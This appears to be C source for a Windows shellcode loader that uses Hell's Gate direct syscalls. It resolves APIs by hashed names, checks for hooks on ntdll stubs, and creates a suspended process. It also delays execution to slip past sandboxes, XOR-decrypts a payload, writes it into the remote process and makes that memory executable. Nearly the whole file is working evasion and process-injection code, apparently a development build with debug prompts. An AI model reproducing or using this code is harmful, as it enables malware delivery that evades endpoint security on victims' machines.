#include <Windows.h>
#include "ApiHashing.h"
#include "Common.h"
#include "CreateProccess.h"
#include "Structs.h"
#include "typedef.h"
#include <stdio.h>

// --------------------------------------------------
// NtCreateUserProcessFlags
// --------------------------------------------------
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001 // NtCreateUserProcess & NtCreateThreadEx
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH 0x00000002 // NtCreateThreadEx only
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 0x00000004 // NtCreateThreadEx only
#define THREAD_CREATE_FLAGS_LOADER_WORKER 0x00000010 // NtCreateThreadEx only
#define THREAD_CREATE_FLAGS_SKIP_LOADER_INIT 0x00000020 // NtCreateThreadEx only
#define THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE 0x00000040 // NtCreateThreadEx only
#define THREAD_CREATE_FLAGS_INITIAL_THREAD 0x00000080 // ?


// --------------------------------------------------
// HASHES FOR DEBUGGING ONLY !!!
// --------------------------------------------------

#define NtCreateUserProcess_JOAA			0xAB7CAA87
#define NtAllocateVirtualMemory_JOAA		0x6E8AC28E
#define NtProtectVirtualMemory_JOAA			0x1DA5BB2B
#define NtWriteVirtualMemory_JOAA			0x319F525A
#define GetTickCount64_JOAA					0x00BB616E
#define RtlCreateProcessParametersEx_JOAA	0x55B87410

#define KERNEL32DLL_JOAA					0xFD2AD9BD
#define NTDLLDLL_JOAA						0x0141C4EE	

// --------------------------------------------------
// --------------------------------------------------

VX_TABLE		g_Sys = { 0 };
API_HASHING		g_Api = { 0 };

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
};

BOOL XorOneByte(UCHAR Key, unsigned char * ShellCodeAddr, SIZE_T Size) {

	for (SIZE_T i = 0; i < Size; ++i) {
		ShellCodeAddr[i] = ShellCodeAddr[i] ^ Key;
	}
	return TRUE;
}

BOOL GetImageExportDirectory(_In_ PVOID pModuleBase, _Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
};

BOOL GetVxTableEntry(_In_ PVOID pModuleBase, _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, _In_ PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (HASHA(pczFunctionName) == pVxTableEntry->uHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}
				cw++;
			};
		}
	}

	if (pVxTableEntry->wSystemCall != NULL)
		return TRUE;
	else
		return FALSE;
};

BOOL InitSysCalls() {

	PRINTA("[i] Init'ing syscalls!\n");

	// Get The PEB
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA) {
		printf("[!] Failed at line 108\n");
		return FALSE;
	}

	// Get NTDLL Module:
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL){
		printf("[!] Couldn't get EAT\n");
		return FALSE;
	}
	// --------------------------------------------------
	// Init the syscalls:
	// --------------------------------------------------

	g_Sys.NtCreateUserProcess.uHash		= NtCreateUserProcess_JOAA;
	g_Sys.NtAllocateVirtualMemory.uHash	= NtAllocateVirtualMemory_JOAA;
	g_Sys.NtProtectVirtualMemory.uHash	= NtProtectVirtualMemory_JOAA;
	g_Sys.NtWriteVirtualMemory.uHash	= NtWriteVirtualMemory_JOAA;
	
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateUserProcess)		||
		!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtAllocateVirtualMemory) ||
		!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtProtectVirtualMemory)	||
		!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtWriteVirtualMemory)) {
		printf("[!] Syscalls failed to init !!!\n");
		return FALSE;
	}

	// --------------------------------------------------
	// Init the WinAPI:
	// --------------------------------------------------

	// Kernel32.dll
	g_Api.pGetTickCount64 =					(fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
	g_Api.pRtlCreateProcessParametersEx =	(fnRtlCreateProcessParametersEx)GetProcAddressH(GetModuleHandleH(NTDLLDLL_JOAA), RtlCreateProcessParametersEx_JOAA);

	if (g_Api.pGetTickCount64 == NULL || g_Api.pRtlCreateProcessParametersEx == NULL) {
		return FALSE;
	}
	return TRUE;
};

// Helper Function
VOID _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc)
			Length = 0xfffc;

		UsStruct->Length = Length;
		UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
	}

	else UsStruct->Length = UsStruct->MaximumLength = 0;
}

BOOL WrapNtCreateUserProcess(
	IN PWSTR szTargetProcess,
	IN PWSTR szTargetProcessParameters,
	IN PWSTR szTargetProcessPath,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread
) {
	printf("[i] Starting CreateUserProcess ...\n");
	NTSTATUS STATUS = NULL;
	UNICODE_STRING UsNtImagePath = { 0 };
	UNICODE_STRING UsCommandLine = { 0 };
	UNICODE_STRING UsCurrentDirectory = { 0 };
	PRTL_USER_PROCESS_PARAMETERS UppProcessParameters = NULL;

	// Buf to hold the value of the attribute lists
	PPS_ATTRIBUTE_LIST pAttributeList = (PPS_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(PS_ATTRIBUTE_LIST));

	if (!pAttributeList) {
		PRINTA("[!] Error allocating mem for Attribute lists !!!\n");
		return FALSE;
	}
	printf("[i] pAttributeList allocated !\n");

	// Init UNICODE_STRING Structs with inputted paths:
	_RtlInitUnicodeString(&UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&UsCurrentDirectory, szTargetProcessPath);

	PRINTA("[i] UNICODE STRING Structs inited \n");

	// Init structure for the syscall
	//             pRtlCreateProcessParemetersEx
	STATUS = g_Api.pRtlCreateProcessParametersEx(
		&UppProcessParameters,
		&UsNtImagePath,
		NULL,
		&UsCurrentDirectory,
		&UsCommandLine,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		PRINTA("[!] RtlCreateProcessParametersEx Failed with error: 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}
	PRINTA("[i] RtlCreateProcessParametersEx Returned...\n");

	// Setting len of attribute list
	pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

	// Init attribute list that specifies image path
	pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size = UsNtImagePath.Length;
	pAttributeList->Attributes[0].Value = (ULONG_PTR)UsNtImagePath.Buffer;

	// Standard creation:
	PS_CREATE_INFO psCreateInfo = {
		.Size = sizeof(PS_CREATE_INFO),
		.State = PsCreateInitialState
	};

	// Create the process
	HellsGate(g_Sys.NtCreateUserProcess.wSystemCall);
	STATUS = HellDescent(
		hProcess,
		hThread,
		PROCESS_ALL_ACCESS,
		THREAD_ALL_ACCESS,
		NULL,
		NULL,
		NULL,
		THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
		UppProcessParameters,
		&psCreateInfo,
		pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		PRINTA("[!] NtCreateUserProcess Failed with error: 0x%0.8X\n", STATUS);
		goto _EndOfFunc;
	}
	PRINTA("[i] Process created ...");
	getchar();
_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}

BOOL DelayExecution(FLOAT ftMinutes) {

	DWORD dwMilliSeconds = ftMinutes * 60000;

	PRINTA("[*] Event creation ...\n");
	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);

	PRINTA("[*] Fake event created ...\n");


	DWORD _T0 = NULL;
	DWORD _T1 = NULL;

	PRINTA("Getting t0...\n");
	_T0 = g_Api.pGetTickCount64();
	PRINTA("Got t0...\n");

	if (WaitForSingleObject(hEvent, dwMilliSeconds) == WAIT_FAILED) {
		PRINTA("[!] WaitForSingleObject Failed with Error : %d\n", GetLastError());
		return FALSE;
	}

	PRINTA("waitinf for single object done...\n");

	_T1 = g_Api.pGetTickCount64();

	if ((DWORD)(_T1 - _T0) < dwMilliSeconds) {
		return FALSE;
	}

	CloseHandle(hEvent);
	PRINTA("[i] Execution delay done...\n");
	return TRUE;
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	SIZE_T	sNumberOfBytesWritten = NULL;
	SIZE_T sSizeOfPayload = sSizeOfShellcode;
	DWORD	dwOldProtection = NULL;
	NTSTATUS Status = NULL;

	HellsGate(g_Sys.NtAllocateVirtualMemory.wSystemCall);
	Status = HellDescent(hProcess, ppAddress, 0, &sSizeOfShellcode, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (Status != 0) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	PRINTA("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);

	PRINTA("\t[#] Press <Enter> To Write Payload ...\n");
	getchar();

	PRINTA("\t[i] Decrypting payload...");
	if (!XorOneByte(XOR_KEY, pShellcode, sSizeOfPayload)) {
		PRINTA("\t[!] Failed to decrypt payload !!\n");
		return FALSE;
	}

	PRINTA("[#] Press <ENTER> To continue\n");
	getchar();

	HellsGate(g_Sys.NtWriteVirtualMemory.wSystemCall);
	Status = HellDescent(hProcess, *ppAddress, pShellcode, sSizeOfPayload, &sNumberOfBytesWritten);
	if (Status != 0) {
		PRINTA("\n\t[!] WriteProcessMemory Failed !!! \n");
		return FALSE;
	}

	PRINTA("\t[+] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
	getchar();


	PRINTA("[i] Changing memory permissions ...\n");
	// TODO: Replace with syscall
	HellsGate(g_Sys.NtProtectVirtualMemory.wSystemCall);
	Status = HellDescent(hProcess, ppAddress, &sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection);
	if (Status != 0) {
		PRINTA("\n\t[!] VirtualProtectEx Failed With Error!!!\n\n");
		return FALSE;
	}

	return TRUE;
}